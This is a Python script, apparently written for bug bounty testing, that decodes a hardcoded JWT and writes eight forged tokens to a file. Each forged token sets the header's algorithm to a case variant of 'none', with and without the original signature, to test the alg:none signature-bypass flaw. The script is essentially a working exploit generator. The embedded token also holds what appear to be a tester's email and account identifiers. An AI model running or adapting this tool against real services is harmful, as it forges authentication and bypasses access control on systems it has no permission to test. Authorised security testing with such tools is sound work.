import base64
import json
from itsdangerous import base64_encode

#NOTE: This file will take Input JWT, decode, and provide (4) variations of (alg:none) attack, re-encoding to JWT headers.
JWT = "eyJhbGciOiAiUlMyNTYiLCAidHlwIjogIkpXVCIsICJraWQiOiAiMjAyMC0wMS0wOS1zdGFnaW5nIiwgInN1cGVyQWRtaW4iOiAiVHJ1ZSJ9.ewogICJzZXJ2ZXJSZWdpb24iIDogIlVTIiwKICAic3VwZXJBZG1pbiIgOiBmYWxzZSwKICAianRpIiA6ICIxODVkNzE3ZC02NDZlLTQ2MDUtOTBjYS00NzViNWVmMDhlZjAiLAogICJpYXQiIDogMTcwMTM5NzU5MCwKICAic3ViIiA6ICIyNmZmNjE1Zi1mMTU1LTRhNDctOThkZS0yZTM3OTJiOWM3NWMiLAogICJlbWFpbCIgOiAiZGVpejYzK25hdmFuQGJ1Z2Nyb3dkbmluamEuY29tIiwKICAiZ2l2ZW5fbmFtZSIgOiAiZGVpeiIsCiAgImZhbWlseV9uYW1lIiA6ICJzaXh0aHJlZSIsCiAgInByZWZlcnJlZF9uYW1lIiA6ICJkZWl6IiwKICAicm9sZXMiIDogWyBdLAogICJwZXJtaXNzaW9ucyIgOiBbIF0sCiAgImNvbXBhbnlVdWlkIiA6ICI1Yzc1ZmNjMC1hZmMwLTRjMzItODdmMi02ZDRiNjRhOWIzNzIiLAogICJpbXBlcnNvbmF0ZWQiIDogZmFsc2UsCiAgImltcGVyc29uYXRvclN1cGVyQWRtaW4iIDogZmFsc2UsCiAgInJlZmVycmVyIiA6ICJUUklQQUNUSU9OUyIsCiAgInJlX3NpZ25fdG9rZW4iIDogZmFsc2UKfQ.maqQVdGMAyPXT0nkPcU2gGomRioVD8BqQUZkcg4wub3qFu0Pghp1Gs9r0dCYEZOOFJEh0bUX8PEtbPkRRIdwmUQt08cFQj-wS4pTAhU2bVm10UclQ9fCAd3XDembzaI_v3y2GVQS75rCTQIGsqFOY_ZsiaxpTBU-sndsI3QaDM8bzTg1rgVdJ2yjJH2yn9Too1c725_YRTMdg2LrV_4wix_rrfFse3rRVugTafrDwHtpnlhwCi4jQaodM9f2qEePRwB5R-qhf0F98iYJLjF8XOJCLd1q-EW5zy_3HQdsBWyIbqZA9UkXxo9EpncE16fWdNZfD2FtupgYbsoT3nCCiHNT3T-z3vZcU9s_nm3wxUm9NIbCRXb1cwiQh_O8Z2Vw7ZAYJIelQKUBE9_VDTpH16ZS353N1UgT9l7UukskNjgBpQeyL1Zk-XgbgiW0TdVk9inVBrzbk_v4rutZrr1poJ_KC7-YizSiAuEHARY4ScySEG_vbTAZabarJ3IZEqmhThhd9ry7MCq1VGknQzQcSxZnCb2hB_IrHIWRT-hxw4_3_vMr0-evzsqH2B1s8EqqCEzeoLC6XO_o3kPuxwKlc2yDaScZ8rWwoDKK5r5wRjzox0qtkMRiF8HWG1XQGmyKPy01QSkrHqlUHsypk3L-xjaOG2iI2BbHP8wgS72XBFA"
jwtsplit = JWT.split(".")  
jwtsplit1 = (jwtsplit[0])
jwtsplit2 = (jwtsplit[1])
jwtsplit3 = (jwtsplit[2])
split1len = (len(jwtsplit1))
split2len = (len(jwtsplit2))
print('Target JWT')

print('\033[1;24;40m Input Header : ')
remndr1 = (split1len % 4) #NOTE: Check Remainder for Modulus of 4, add = padding
if remndr1 == 0:
    print(jwtsplit1)
elif remndr1 == 1:    
    jwtsplit1 = (jwtsplit1 + "===")
    print(jwtsplit1)
elif remndr1 == 2:
    jwtsplit1 = (jwtsplit1 + "==")
    print(jwtsplit1)
elif remndr1 == 3:
    jwtsplit1 = (jwtsplit1 + "=")
    print(jwtsplit1)   

print(' Input Payload : ')
remndr2 = (split2len % 4) #NOTE: Check Remainder for Modulus of 4, add = padding
if remndr2 == 0:
    print(jwtsplit2)
elif remndr2 == 1:    
    jwtsplit2 = (jwtsplit2 + "===")
    print(jwtsplit2)
elif remndr2 == 2:
    jwtsplit2 = (jwtsplit2 + "==")
    print(jwtsplit2)
elif remndr2 == 3:
    jwtsplit2 = (jwtsplit2 + "=")
    print(jwtsplit2)   
    
print(f" Signature:, (characters = {len(jwtsplit3)})")
print(jwtsplit3)
print('')
print('\033[0;30;41m Base64 Decoded JWT - Header')
split1b = base64.b64decode(jwtsplit1)
split2b = base64.b64decode(jwtsplit2)

split1d = split1b.decode()
split2d = split2b.decode()

print(split1d)
print(split2d)
#print(split1d)
json1d = json.loads(split1d)
#print(json1d["alg"])
#print(json1d)
header_reencoded = base64.b64encode(split1b)
#print(header_reencoded.decode())


# Decode the first part (header) and load it as a JSON
header = base64.urlsafe_b64decode(jwtsplit1)
header_json = json.loads(split1d)

print('\033[0;32;40m Modified JWT Headers') # Signature removed, alg:None 
# Modify the "alg" value
header_json_none = header_json["alg"] = "none"  # Change to your desired algorithm
print('alg = none')
print(header_json)
modified_header_none = base64.urlsafe_b64encode(json.dumps(header_json).encode()).decode().rstrip("=")
print(modified_header_none)

header_json_None = header_json["alg"] = "None"  # Change to your desired algorithm
print('alg = None')
print(header_json)
modified_header_None = base64.urlsafe_b64encode(json.dumps(header_json).encode()).decode().rstrip("=")
print(modified_header_None)

header_json_NoNe = header_json["alg"] = "NoNe"  # Change to your desired algorithm
print('alg = NoNe ')
print(header_json)
modified_header_NoNe = base64.urlsafe_b64encode(json.dumps(header_json).encode()).decode().rstrip("=")
print(modified_header_NoNe)


header_json_NONE = header_json["alg"] = "NONE"  # Change to your desired algorithm
print('alg = NONE ')
print(header_json)
modified_header_NONE = base64.urlsafe_b64encode(json.dumps(header_json).encode()).decode().rstrip("=")
print(modified_header_NONE)
#print('\033[0;37;44m ')

# Combine the modified header and Payload. (No Signature)
none_jwt_nosig = ".".join([modified_header_none, jwtsplit2])
None_jwt_nosig = ".".join([modified_header_None, jwtsplit2])
NoNe_jwt_nosig = ".".join([modified_header_NoNe, jwtsplit2])
NONE_jwt_nosig = ".".join([modified_header_NONE, jwtsplit2])

# Combine the modified header and Payload. (With Signature)
none_jwt_sig = ".".join([modified_header_none, jwtsplit2, jwtsplit3])
None_jwt_sig = ".".join([modified_header_None, jwtsplit2, jwtsplit3])
NoNe_jwt_sig = ".".join([modified_header_NoNe, jwtsplit2, jwtsplit3])
NONE_jwt_sig = ".".join([modified_header_NONE, jwtsplit2, jwtsplit3])
#For all check : none, None, NoNE, NONE(add nOnE?)
#print("")
#print(none_jwt_nosig)
#print(None_jwt_nosig)
#print(NoNe_jwt_nosig)
#print(NONE_jwt_nosig)
#print('\033[1;24;40m Original Payload : ')
#print(jwtsplit2)
#print('\033[1;37;40m Original Signature : ')
#print(jwtsplit3)

#NOTE: OUTPUT to 'jwt-output.txt' : All 4 none headers with payload (no signature)
#print(see OUTPUT-FILE FOR list of complete JWTs)

with open("jwt-output.txt", "w") as out:
    #out.writelines([none_jwt_nosig, None_jwt_nosig, NoNe_jwt_nosig, NONE_jwt_nosig])
    # NOTE : Output to file : (4) Alg:none Types, w/ & wo/ Signature) none-noSig, None-noSig, NoNe-noSig, NONE-noSig, none-Sig, None-Sig, NoNe-Sig, NONE-Sig
    out.write('{}\n{}\n{}\n{}\n{}\n{}\n{}\n{}\n'.format(none_jwt_nosig,None_jwt_nosig,NoNe_jwt_nosig,NONE_jwt_nosig,none_jwt_sig,None_jwt_sig,NoNe_jwt_sig,NONE_jwt_sig))
    out.close()
